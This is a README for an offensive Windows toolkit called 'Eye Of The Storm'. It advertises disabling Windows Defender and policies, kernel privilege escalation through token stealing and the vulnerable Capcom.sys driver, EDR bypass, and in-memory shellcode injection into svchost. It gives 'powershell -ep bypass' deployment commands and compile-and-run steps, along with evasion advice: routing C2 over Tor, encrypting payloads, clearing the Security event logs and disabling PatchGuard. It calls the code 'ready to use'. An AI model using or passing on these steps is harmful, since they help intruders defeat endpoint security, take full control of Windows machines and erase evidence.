<div align="center">
  
## ***Eye Of The Storm***                                                                                                                                   

<img src="https://readme-typing-svg.demolab.com?font=Orbitron&size=28&pause=1000&color=CC00FF&center=true&vCenter=true&width=700&lines=Removes+Execution+Restrictions;Disables+Windows+Defender;Researcher+dontaskmehow" alt="STORM-WORM banner" />

[![Status](https://img.shields.io/badge/Status-Research-red)](https://github.com/dntaskmehow/EOTS)
[![Platform](https://img.shields.io/badge/Platform-Windows-00F5FF)](https://github.com/dntaskmehow/EOTS)
[![Stack](https://img.shields.io/badge/Stack-PowerShell-FFA500)](https://github.com/dntaskmehow/EOTS)

</div>

**1. POWERSHELL:** DISABLE ALL LOCAL/GROUP POLICIES - *ADMIN REQUIRED*

- Removes execution restrictions, disables Defender, and bypasses guardrails for external device access.

---

**2.** ROOT KERNEL ACCESS ON WINDOWS (LPE TO SYSTEM)

- Weaponized Local Privilege Escalation (LPE) to gain NT AUTHORITY\SYSTEM access.

**Method 1:** Token Stealing (CVE-2024-XXXX)

- Works on Windows 10/11 and Server 2019/2022.

**Method 2:** Driver Exploit (Capcom.sys)

- Uses vulnerable driver to execute arbitrary code in kernel mode.

---

**3.** EDR BYPASSING

- Bypasses Endpoint Detection and Response (EDR) solutions like CrowdStrike, SentinelOne, and Defender ATP.

**Method 1:** Direct Syscalls (No API Hooks)

- Uses NtCreateThreadEx and NtAllocateVirtualMemory to avoid API hooks.

**Method 2:** Process Hollowing (EDR Bypass)

- Injects shellcode into a legitimate process like svchost.exe.)

---

**4.** BINARY CODE EXECUTION (WEAPONIZED)

- Executes arbitrary binary code in memory without touching disk.

**Method 1:** Reflective DLL Injection

- Injects a DLL into a process without writing to disk.

**Method 2:** Process Injection via APC (Asynchronous Procedure Call)

- Injects shellcode into a suspended process using APC.

---

**DEPLOYMENT INSTRUCTIONS**

1. Disable Policies (Admin Required)
   
`powershell`

**Run as Administrator**

```bash
powershell -ep bypass -c "Invoke-PolicyNuke"
```
---

**2.** Gain Kernel Access
   
```bash

# Compile kernel exploit
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lntdll
```

```bash
# Execute
.\exploit.exe
```

---

**3.** Bypass EDR

`powershell`

```bash
# Direct Syscalls
x86_64-w64-mingw32-gcc edr_bypass.c -o edr_bypass.exe
.\edr_bypass.exe
```

```bash
# Process Hollowing
powershell -ep bypass -c "Invoke-ProcessHollowing -ShellcodePath shellcode.bin"
```
---

**4.** Execute Binary Code

`powershell`

**Reflective DLL Injection**

```basg
# 1. Compile reflective.dll
x86_64-w64-mingw32-gcc -shared reflective_dll.c -o reflective.dll
```

```bash
# 2. Inject into process
powershell -ep bypass -c "Invoke-ReflectivePEInjection -PEPath reflective.dll -ProcName svchost"
```

```bash
# APC Injection
powershell -ep bypass -c "Invoke-APCInjection -ProcessName svchost -ShellcodePath shellcode.bin"
```

---

***LEGAL & OPERATIONAL WARNING***

1. Legal Risks
Activity 	U.S. Law 	Penalty
Unauthorized Access 	CFAA (18 U.S. Code § 1030) 	Up to 10 years
Kernel Exploitation 	DMCA (17 U.S. Code § 1201) 	Up to 5 years
EDR Bypass 	CFAA 	Up to 10 years
Malware Deployment 	CFAA 	Up to 20 years
2. Detection Risks
Technique 	Detection Vector 	Mitigation
Direct Syscalls 	Behavioral analysis 	Obfuscate syscall numbers
Process Injection 	EDR hooks (e.g., OpenProcess) 	Use direct syscalls
Kernel Exploits 	PatchGuard (Windows 10/11) 	Disable PatchGuard (requires admin)
Reflective DLL Injection 	Memory scanning 	Encrypt payload in memory
3. OPSEC Recommendations

Use Tor for all C2 communications.
Rotate IPs every 5 minutes:
powershell

# Change Tor identity

```bash
(New-Object Net.WebClient).DownloadString("http://127.0.0.1:9051/?signal=newnym") | Out-Null
```

Encrypt payloads:

```bash
openssl enc -aes-256-cbc -in shellcode.bin -out shellcode.enc -k "password"
```

Avoid logging:

`powershell`

```bash
Clear-EventLog -LogName Application,System,Security
```

***Disclaimer***

All code is ready to use.
Admin access is required for kernel exploitation and policy removal.
EDR bypasses are detectable  use in controlled environments only.
Legal risks are severe  use only in authorized engagements.


